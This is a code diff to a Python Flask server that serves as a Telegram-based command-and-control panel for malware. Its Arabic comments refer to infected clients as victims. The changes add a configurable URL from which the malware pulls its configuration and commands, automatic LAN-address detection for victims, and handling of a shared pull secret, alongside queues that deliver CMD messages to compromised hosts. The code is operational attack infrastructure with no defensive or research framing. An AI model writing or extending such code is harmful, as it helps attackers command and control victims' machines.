@@ -32,6 +32,20 @@ from modules.encryption import (
 )
 from modules.c2_telegram_ids import resolve_c2_chats, DEFAULT_GROUP, DEFAULT_CHANNEL
 
+
+def _detect_lan_bind_ip() -> str:
+    """IPv4 للواجهة التي يخرج منها السيرفر — يُستخدم كأساس http://IP:5000 لعملاء على نفس LAN."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(0.6)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip or ""
+    except Exception:
+        return ""
+
+
 app = Flask(__name__)
 
 # ======================== تفعيل CORS ========================
@@ -277,41 +291,38 @@ ALL_CHATS = list(_DEFAULT_CHATS)
 C2_GROUP_ID = DEFAULT_GROUP
 C2_CHANNEL_ID = DEFAULT_CHANNEL
 C2_BOT_TOKEN = (_DEFAULT_TOKEN or "").strip()
+# عنوان السحب الذي يُكتب في telegram_config.json لنسخ الملف إلى الضحية — يعلنه المالوير من JSON.
+TELEGRAM_C2_SERVER_URL = ""
+MALWARE_PULL_SECRET = "c2_malware_pull_default_change_me"
+
 
 def _load_telegram_config():
     global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
+    global TELEGRAM_C2_SERVER_URL, MALWARE_PULL_SECRET
     cfg: dict = {}
     if os.path.exists(TELEGRAM_CONFIG_PATH):
         try:
             with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
                 cfg = json.load(f)
-            TOKEN     = cfg.get('token', _DEFAULT_TOKEN) or _DEFAULT_TOKEN
-            ALL_CHATS = cfg.get('chat_ids', _DEFAULT_CHATS) or []
-            logger.info(f"✅ Telegram config loaded — chats: {ALL_CHATS}")
+            logger.info(f"✅ Telegram config loaded — chats: {cfg.get('chat_ids')}")
         except Exception as e:
             logger.error(f"Failed to load telegram config: {e}")
+            cfg = {}
+    TOKEN = cfg.get('token', _DEFAULT_TOKEN) or _DEFAULT_TOKEN
+    ALL_CHATS = cfg.get('chat_ids', _DEFAULT_CHATS) or []
     merged = {**cfg, "chat_ids": ALL_CHATS}
     C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(merged)
     C2_BOT_TOKEN = (TOKEN or _DEFAULT_TOKEN).strip()
+    TELEGRAM_C2_SERVER_URL = str(cfg.get("c2_server_url") or "").strip().rstrip("/")
+    if os.environ.get("MALWARE_PULL_SECRET", "").strip():
+        MALWARE_PULL_SECRET = os.environ["MALWARE_PULL_SECRET"].strip()
+    elif cfg.get("malware_pull_secret"):
+        MALWARE_PULL_SECRET = str(cfg["malware_pull_secret"]).strip()
+    else:
+        MALWARE_PULL_SECRET = "c2_malware_pull_default_change_me"
     logger.info(f"📍 C2 Telegram — group: {C2_GROUP_ID}  channel: {C2_CHANNEL_ID}")
-
-def _save_telegram_config():
-    try:
-        existing: dict = {}
-        if os.path.exists(TELEGRAM_CONFIG_PATH):
-            try:
-                with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
-                    existing = json.load(f)
-            except Exception:
-                existing = {}
-        existing['token'] = TOKEN
-        existing['chat_ids'] = ALL_CHATS
-        existing['c2_group_id'] = C2_GROUP_ID
-        existing['c2_channel_id'] = C2_CHANNEL_ID
-        with open(TELEGRAM_CONFIG_PATH, 'w', encoding='utf-8') as f:
-            json.dump(existing, f, ensure_ascii=False, indent=2)
-    except Exception as e:
-        logger.error(f"Failed to save telegram config: {e}")
+    if TELEGRAM_C2_SERVER_URL:
+        logger.info(f"📥 Malware pull URL (في telegram_config): {TELEGRAM_C2_SERVER_URL}")
 
 _load_telegram_config()
 
@@ -324,8 +335,7 @@ _tg_last_update_id = 0
 CLIENT_OFFLINE_AFTER_SEC = int(os.environ.get("CLIENT_OFFLINE_AFTER_SEC", "120"))
 
 # رسائل موجهة لكل عميل (PUBLIC_KEY / HANDSHAKE_OK / CMD) — يَسحبها malware.py عبر HTTP
-# حتى لا يتنافس عدة عملاء على نفس getUpdates لبوت واحد.
-MALWARE_PULL_SECRET = os.environ.get("MALWARE_PULL_SECRET", "c2_malware_pull_default_change_me")
+# حتى لا يتنافس عدة عملاء على نفس getUpdates لبوت واحد. القيمة من البيئة تغلب ملف telegram_config.json.
 malware_downlink: dict = defaultdict(lambda: deque(maxlen=64))
 
 
@@ -1170,6 +1180,10 @@ def get_telegram_config():
         "chat_ids": ALL_CHATS,
         "c2_group_id": C2_GROUP_ID,
         "c2_channel_id": C2_CHANNEL_ID,
+        "c2_server_url": TELEGRAM_C2_SERVER_URL,
+        "has_malware_pull_secret": bool(
+            MALWARE_PULL_SECRET and MALWARE_PULL_SECRET != "c2_malware_pull_default_change_me"
+        ),
     })
 
 @app.route("/update_telegram_settings", methods=["POST"])
@@ -1178,7 +1192,7 @@ def get_telegram_config():
 def update_telegram_settings():
     global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
     data = request.json or {}
-    cfg = {}
+    cfg: dict = {}
     if os.path.exists(TELEGRAM_CONFIG_PATH):
         try:
             with open(TELEGRAM_CONFIG_PATH, 'r', encoding='utf-8') as f:
@@ -1195,10 +1209,43 @@ def update_telegram_settings():
         cfg["c2_group_id"] = str(data["c2_group_id"]).strip()
     if "c2_channel_id" in data and data["c2_channel_id"] is not None and str(data["c2_channel_id"]).strip():
         cfg["c2_channel_id"] = str(data["c2_channel_id"]).strip()
+    if "c2_server_url" in data:
+        v = data["c2_server_url"]
+        if v is None or str(v).strip() == "":
+            cfg.pop("c2_server_url", None)
+        else:
+            cfg["c2_server_url"] = str(v).strip().rstrip("/")
+    if data.get("c2_server_url_auto"):
+        lip = _detect_lan_bind_ip()
+        if lip:
+            cfg["c2_server_url"] = f"http://{lip}:5000"
+            logger.info(f"📡 Set malware pull URL (LAN): {cfg['c2_server_url']}")
+        else:
+            logger.warning("c2_server_url_auto: LAN IP detection failed")
+    if "malware_pull_secret" in data:
+        v = data["malware_pull_secret"]
+        if v is None or str(v).strip() == "":
+            cfg.pop("malware_pull_secret", None)
+        else:
+            cfg["malware_pull_secret"] = str(v).strip()
+
     C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(cfg)
     C2_BOT_TOKEN = (TOKEN or _DEFAULT_TOKEN).strip()
-    _save_telegram_config()
-    logger.info(f"📍 Telegram settings updated — group: {C2_GROUP_ID}  channel: {C2_CHANNEL_ID}")
+    try:
+        cfg_dir = os.path.dirname(os.path.abspath(TELEGRAM_CONFIG_PATH))
+        if cfg_dir:
+            os.makedirs(cfg_dir, exist_ok=True)
+        with open(TELEGRAM_CONFIG_PATH, 'w', encoding='utf-8') as f:
+            json.dump(cfg, f, ensure_ascii=False, indent=2)
+    except Exception as e:
+        logger.error(f"Failed to save telegram config: {e}")
+        return jsonify({"error": str(e)}), 500
+
+    _load_telegram_config()
+    logger.info(
+        f"📍 Telegram updated — group: {C2_GROUP_ID}  channel: {C2_CHANNEL_ID}  "
+        f"pull_url: {TELEGRAM_C2_SERVER_URL or '(none)'}"
+    )
     return jsonify({"status": "updated"})
 
 @app.route("/telegram_config", methods=["DELETE"])
@@ -1206,11 +1253,21 @@ def update_telegram_settings():
 @require_auth
 def delete_telegram_config():
     global TOKEN, ALL_CHATS, C2_GROUP_ID, C2_CHANNEL_ID, C2_BOT_TOKEN
-    TOKEN     = ""
+    global TELEGRAM_C2_SERVER_URL, MALWARE_PULL_SECRET
+    try:
+        if os.path.exists(TELEGRAM_CONFIG_PATH):
+            os.remove(TELEGRAM_CONFIG_PATH)
+    except Exception as e:
+        logger.error(f"Failed to remove telegram config: {e}")
+    TOKEN = ""
     ALL_CHATS = []
     C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats({})
     C2_BOT_TOKEN = (_DEFAULT_TOKEN or "").strip()
-    _save_telegram_config()
+    TELEGRAM_C2_SERVER_URL = ""
+    if os.environ.get("MALWARE_PULL_SECRET", "").strip():
+        MALWARE_PULL_SECRET = os.environ["MALWARE_PULL_SECRET"].strip()
+    else:
+        MALWARE_PULL_SECRET = "c2_malware_pull_default_change_me"
     logger.info("🗑️ Telegram config cleared")
     return jsonify({"status": "deleted"})
 
